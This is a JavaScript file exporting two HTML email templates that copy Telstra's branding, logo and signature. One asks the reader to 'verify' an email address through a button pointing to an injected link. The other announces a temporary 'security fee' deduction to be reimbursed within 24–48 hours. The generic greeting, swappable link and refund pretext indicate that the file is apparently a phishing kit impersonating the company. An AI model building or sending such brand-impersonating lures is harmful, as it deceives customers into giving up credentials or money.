export function getEmailTemplate(link) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Please Verify Your Email Address</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: #f5f5f5;
    }
    .email-container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #ffffff;
    }
    .header-gradient {
      background: linear-gradient(to right, #FFB366 0%, #E8A5D8 100%);
      height: 8px;
      width: 100%;
    }
    .header-content {
      padding: 20px 30px;
      display: flex;
      justify-content: flex-end;
      background-color: #ffffff;
    }
    .telstra-logo {
      width: 40px;
      height: 40px;
    }
    .main-content {
      padding: 40px 30px;
      background-color: #ffffff;
    }
    .title {
      font-size: 28px;
      font-weight: 700;
      color: #582C7F;
      margin: 0 0 30px 0;
      line-height: 1.3;
    }
    .greeting {
      font-size: 16px;
      color: #000000;
      margin: 0 0 20px 0;
      line-height: 1.6;
    }
    .body-text {
      font-size: 16px;
      color: #000000;
      margin: 0 0 20px 0;
      line-height: 1.6;
    }
    .link-container {
      margin: 25px 0;
      padding: 0;
    }
    .link-text {
      font-size: 16px;
      color: #0D54FF;
      text-decoration: underline;
      word-break: break-all;
    }
    .verify-button {
      display: inline-block;
      padding: 14px 32px;
      background: linear-gradient(to right, #FFB366 0%, #E8A5D8 100%);
      color: #FFFFFF;
      text-decoration: none;
      font-size: 16px;
      font-weight: 600;
      border-radius: 4px;
      margin: 20px 0;
      text-align: center;
    }
    .verify-button:hover {
      opacity: 0.9;
    }
    .important {
      font-weight: 700;
      color: #000000;
    }
    .closing {
      font-size: 16px;
      color: #000000;
      margin: 30px 0 10px 0;
      line-height: 1.6;
    }
    .signature {
      font-size: 16px;
      color: #000000;
      margin: 5px 0;
      line-height: 1.6;
    }
    .help-section {
      padding: 30px 30px;
      background-color: #ffffff;
      border-top: 1px solid #e0e0e0;
    }
    .help-title {
      font-size: 18px;
      font-weight: 700;
      color: #582C7F;
      margin: 0 0 20px 0;
    }
    .help-items {
      display: flex;
      flex-wrap: wrap;
      gap: 25px;
      margin-bottom: 0;
    }
    .help-item {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .help-icon {
      width: 24px;
      height: 24px;
      color: #582C7F;
    }
    .help-text {
      font-size: 16px;
      color: #000000;
    }
    .footer-gradient {
      background: linear-gradient(to right, #E66464 0%, #E696DC 100%);
    }
    @media only screen and (max-width: 600px) {
      .main-content, .help-section {
        padding: 30px 20px;
      }
      .title {
        font-size: 24px;
      }
      .help-items {
        flex-direction: column;
        gap: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="email-container">
    <!-- Header Gradient -->
    <div class="header-gradient"></div>
    
    <!-- Header with Logo -->
    <div class="header-content">
      <svg class="telstra-logo" viewBox="0 0 33 33" xmlns="http://www.w3.org/2000/svg">
        <g fill="none" fillRule="evenodd">
          <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" fill="#F96449"/>
          <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" fill="#0D54FF"/>
        </g>
      </svg>
    </div>
    
    <!-- Main Content -->
    <div class="main-content">
      <h1 class="title">Please Verify Your Email Address</h1>
      
      <p class="greeting">Dear Customer,</p>
      
      <p class="body-text">
        To complete your Telstra account setup and ensure security, please verify your email address by clicking the link below:
      </p>
      
      <div style="text-align: center; margin: 25px 0;">
        <a href="${link}" class="verify-button">Click here</a>
      </div>
      
      <p class="body-text">
        If you did not request this, please ignore this message or contact Customer Support or reply to this email for queries.
      </p>
      
      <p class="body-text">
        Thank you for your prompt action.
      </p>
      
      <p class="closing">Kind regards,</p>
      <p class="signature">Telstra Customer Care</p>
      <p class="signature">Telstra Corporation Limited</p>
    </div>
    
    <!-- Footer Gradient with Social Icons -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background: linear-gradient(to right, #E66464 0%, #E696DC 100%);">
      <tr>
        <td align="center" style="padding: 10px 30px 6px 30px;">
          <table cellpadding="0" cellspacing="0" border="0">
            <tr>
              <td align="center" style="padding: 0 10px;">
                <a href="https://www.facebook.com/telstra" style="color: #FFFFFF; text-decoration: none; font-family: Arial, sans-serif; font-size: 22px; font-weight: 600; line-height: 1;">f</a>
              </td>
              <td align="center" style="padding: 0 10px;">
                <a href="https://www.linkedin.com/company/telstra" style="color: #FFFFFF; text-decoration: none; font-family: Arial, sans-serif; font-size: 22px; font-weight: 600; line-height: 1;">in</a>
              </td>
              <td align="center" style="padding: 0 10px;">
                <a href="https://twitter.com/telstra" style="color: #FFFFFF; text-decoration: none; font-family: Arial, sans-serif; font-size: 22px; font-weight: 600; line-height: 1;">X</a>
              </td>
            </tr>
          </table>
        </td>
      </tr>
    </table>
  </div>
</body>
</html>
  `;
}

export function getSecurityDepositEmailTemplate() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Deposit Deduction and Reimbursement</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: #f5f5f5;
    }
    .email-container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #ffffff;
    }
    .header-gradient {
      background: linear-gradient(to right, #FFB366 0%, #E8A5D8 100%);
      height: 8px;
      width: 100%;
    }
    .header-content {
      padding: 20px 30px;
      display: flex;
      justify-content: flex-end;
      background-color: #ffffff;
    }
    .telstra-logo {
      width: 40px;
      height: 40px;
    }
    .main-content {
      padding: 40px 30px;
      background-color: #ffffff;
    }
    .title {
      font-size: 28px;
      font-weight: 700;
      color: #582C7F;
      margin: 0 0 30px 0;
      line-height: 1.3;
    }
    .greeting {
      font-size: 16px;
      color: #000000;
      margin: 0 0 20px 0;
      line-height: 1.6;
    }
    .body-text {
      font-size: 16px;
      color: #000000;
      margin: 0 0 20px 0;
      line-height: 1.6;
    }
    .link-container {
      margin: 25px 0;
      padding: 0;
    }
    .link-text {
      font-size: 16px;
      color: #0D54FF;
      text-decoration: underline;
      word-break: break-all;
    }
    .verify-button {
      display: inline-block;
      padding: 14px 32px;
      background: linear-gradient(to right, #FFB366 0%, #E8A5D8 100%);
      color: #FFFFFF;
      text-decoration: none;
      font-size: 16px;
      font-weight: 600;
      border-radius: 4px;
      margin: 20px 0;
      text-align: center;
    }
    .verify-button:hover {
      opacity: 0.9;
    }
    .important {
      font-weight: 700;
      color: #000000;
    }
    .closing {
      font-size: 16px;
      color: #000000;
      margin: 30px 0 10px 0;
      line-height: 1.6;
    }
    .signature {
      font-size: 16px;
      color: #000000;
      margin: 5px 0;
      line-height: 1.6;
    }
    .help-section {
      padding: 30px 30px;
      background-color: #ffffff;
      border-top: 1px solid #e0e0e0;
    }
    .help-title {
      font-size: 18px;
      font-weight: 700;
      color: #582C7F;
      margin: 0 0 20px 0;
    }
    .help-items {
      display: flex;
      flex-wrap: wrap;
      gap: 25px;
      margin-bottom: 0;
    }
    .help-item {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .help-icon {
      width: 24px;
      height: 24px;
      color: #582C7F;
    }
    .help-text {
      font-size: 16px;
      color: #000000;
    }
    .footer-gradient {
      background: linear-gradient(to right, #E66464 0%, #E696DC 100%);
    }
    @media only screen and (max-width: 600px) {
      .main-content, .help-section {
        padding: 30px 20px;
      }
      .title {
        font-size: 24px;
      }
      .help-items {
        flex-direction: column;
        gap: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="email-container">
    <!-- Header Gradient -->
    <div class="header-gradient"></div>
    
    <!-- Header with Logo -->
    <div class="header-content">
      <svg class="telstra-logo" viewBox="0 0 33 33" xmlns="http://www.w3.org/2000/svg">
        <g fill="none" fillRule="evenodd">
          <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" fill="#F96449"/>
          <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" fill="#0D54FF"/>
        </g>
      </svg>
    </div>
    
    <!-- Main Content -->
    <div class="main-content">
      <h1 class="title">Security Deposit Deduction and Reimbursement</h1>
      
      <p class="greeting">Dear Customer,</p>
      
      <p class="body-text">
        A security fee has been temporarily deducted from your Telstra account as part of a routine verification process. This is not a charge, and the full amount will be reimbursed within 24–48 hours.
      </p>
      
      <p class="body-text">
        No action is required. The reimbursement will appear in your account balance and transaction history once processed.
      </p>
      
      <p class="body-text">
        We appreciate your patience and cooperation. For any questions, please contact our Customer Support via the Telstra app.
      </p>
      
      <p class="body-text">
        Thank you for choosing Telstra.
      </p>
      
      <p class="closing">Kind regards,</p>
      <p class="signature">Telstra Customer Care</p>
      <p class="signature">Telstra Corporation Limited</p>
    </div>
    
    <!-- Footer Gradient with Social Icons -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background: linear-gradient(to right, #E66464 0%, #E696DC 100%);">
      <tr>
        <td align="center" style="padding: 10px 30px 6px 30px;">
          <table cellpadding="0" cellspacing="0" border="0">
            <tr>
              <td align="center" style="padding: 0 10px;">
                <a href="https://www.facebook.com/telstra" style="color: #FFFFFF; text-decoration: none; font-family: Arial, sans-serif; font-size: 22px; font-weight: 600; line-height: 1;">f</a>
              </td>
              <td align="center" style="padding: 0 10px;">
                <a href="https://www.linkedin.com/company/telstra" style="color: #FFFFFF; text-decoration: none; font-family: Arial, sans-serif; font-size: 22px; font-weight: 600; line-height: 1;">in</a>
              </td>
              <td align="center" style="padding: 0 10px;">
                <a href="https://twitter.com/telstra" style="color: #FFFFFF; text-decoration: none; font-family: Arial, sans-serif; font-size: 22px; font-weight: 600; line-height: 1;">X</a>
              </td>
            </tr>
          </table>
        </td>
      </tr>
    </table>
  </div>
</body>
</html>
  `;
}

